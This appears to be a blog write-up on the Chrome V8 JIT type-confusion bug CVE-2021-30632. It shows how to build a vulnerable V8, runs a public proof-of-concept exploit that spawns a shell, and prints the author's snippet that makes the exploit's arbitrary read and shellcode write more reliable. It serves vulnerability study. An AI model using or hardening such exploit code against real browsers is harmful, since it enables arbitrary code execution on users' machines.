# CVE-2021-30632 Explained

Google Chrome's JavaScript engine, V8, powers billions of browsers and applications. In 2021, a critical bug in V8's Just-In-Time (JIT) compiler, tracked as CVE-2021-30632, was discovered and exploited in the wild. This vulnerability is a textbook example of how subtle assumptions in JIT optimizations can open the door to powerful exploits.

## What Went Wrong?

At its core, this bug was caused by incorrect assumptions about object layouts (also known as maps in V8):

* During JIT optimization, V8 assumed an object’s layout would remain stable.
* In reality, the layout could change, violating that assumption.
* This mismatch led to a type confusion, where V8 treated an object as the wrong type.
* With type confusion, an attacker could achieve arbitrary memory read and write -- the foundation for powerful exploits.


For an in-depth analysis, I highly recommend Man Yue Mo's excellent write-up on the [GitHub Security Lab blog](https://github.blog/security/vulnerability-research/chrome-in-the-wild-bug-analysis-cve-2021-30632/). The original proof-of-concept (PoC) exploit is also [available on GitHub](https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE-2021-30632).

To preserve access, I've also archived the GitHub Security Lab article as a [PDF backup](./cve-2021-30632-analysis.pdf).

In this post, I'll walk through the practical side: building a vulnerable version of V8 and reproducing the exploit PoC

# Building a Vulnerable V8

Because the bug was patched in 2021, we need to compile an old, vulnerable version. Following the PoC instructions, we'll check out v8 version `9.3.345.16` (commit `632e6e7`).

I performed the build on Ubuntu 22.04 64bit. One challenge: Ubuntu 22.04 uses python3.10 as the default python3, which is incompatible with v8's old build scripts. To solve this, we will0 install0 python3.9 and explicitly tell v8 to use it.

## 1. Install python3.9 on Ubuntu 22.04

```bash
# Update package list and install prerequisites
sudo apt update
sudo apt install software-properties-common -y

# Add the Deadsnakes PPA (maintains older Python versions)
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update

# Install Python 3.9
sudo apt install python3.9 python3.9-venv python3.9-distutils -y

# Verify
python3.9 --version
```

> ⚠️ **Note**: Don't replace Ubuntu's default python3 (which is python3.10). Some system tools expect Python 3.10. Instead, we'll just point V8's build system to /usr/bin/python3.9.

## 2. Build v8

```bash
# Install prerequisites
sudo apt-get update
sudo apt-get install -y git curl python3 build-essential pkg-config ninja-build clang lld

# Get depot_tools and put it on PATH
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH="$PWD/depot_tools:$PATH"
echo 'export PATH="$PATH:'"$PWD"'/depot_tools"' >> ~/.bashrc
source ~/.bashrc  # or `source ~/.zshrc`

# Fetch v8
fetch v8
cd v8

# Check out the exact version
git fetch origin --tags --prune
git checkout 9.3.345.16
gclient sync -D --reset --with_branch_heads --with_tags

# Generate build files telling GN which Python to run actions with
gn gen out/x64.release --script-executable=/usr/bin/python3.9

# Build
tools/dev/gm.py x64.release

# Smoke test
out/x64.release/d8 -e "print(1+2)"
```

If everything worked, you should see `3` printed to your terminal.

# Test the PoC

Next, grab the PoC from [Github](https://github.com/github/securitylab/blob/main/SecurityExploits/Chrome/v8/CVE-2021-30632/poc.js), or use our local copy [poc-by-mym.js](./poc-by-mym.js)

```bash
out/x64.release/d8 ./poc-by-mym.js
```

On a vulnerable build, the exploit succeeds and spawns a shell:

```bash
test-v8/v8/out/x64.release$ ./d8 poc-by-mym.js
instance: 81d42dd
elements: 804aba1
rwx page address: 3437bb5bd000
intArray addr: 8106d79
intBackingStore: 5d59854e6ef0
$ # <--- this is the new shell created by the exploit.
```

From here, the attacker effectively gains arbitrary code execution through the compromised V8 instance.

# Make the PoC More Stable

The PoC provided by GibHub Security Lab runs out-of-the-box and works as intended if left unmodified. If you just want to try it as-is, it's already perfect.

However, there is a catch: as [noted by Man Yue Mo](https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE-2021-30632), the exploit is extremely fragile. Even minor changes -- such as adding or removing a comment -- can cause the attack to fail. The original author suggested a manual workaround: swap the two addresses read from the array when things go wrong. This approach works, but it is a bit tedious.

Since I did not want to manually adjust addresses every time, I added a small trick to make the PoC automatically handle this situation.

Here is the relevant snippet:

```js
var elementsAddr = ftoi32(addrs[1])[0];
if (elementsAddr == 0x800222d) {
  print("bad address, but it is OK");
  isBad = true;
}

function arbRead(addr) {
  if (isBad) {
    [addr1, elements] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr1,addr));
  } else {
    [elements, addr1] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr,addr1));
  }
  return writeArr[0];
}

function writeShellCode(rwxAddr, shellArr) {
  ...
  if (isBad) {
    [addr1, elements] = ftoi32(addrs[1]);
    oobWrite(i32tof(addr1, intArrAddr + 0x20));
  } else {
    [elements, addr1] = ftoi32(addrs[1]);
    oobWrite(i32tof(intArrAddr + 0x20, addr1));
  }
  ...
}  
```

What this does is straightforward:

* The PoC checks whether the extracted address looks "bad".
* If so, it automatically swaps the two elements.
* This adjustment is applied consistently in both the arbitrary read and shellcode write functions.

The result is a much more stable exploit. While this does not fix the fragility of the original PoC, it serves as a convenient workaround. Now, I can modify or extend the PoC (even with comments!) without worrying about it breaking.

👉 The complete stabilized PoC is available here: [poc-by-mym-stable.js](./poc-by-mym-stable.js).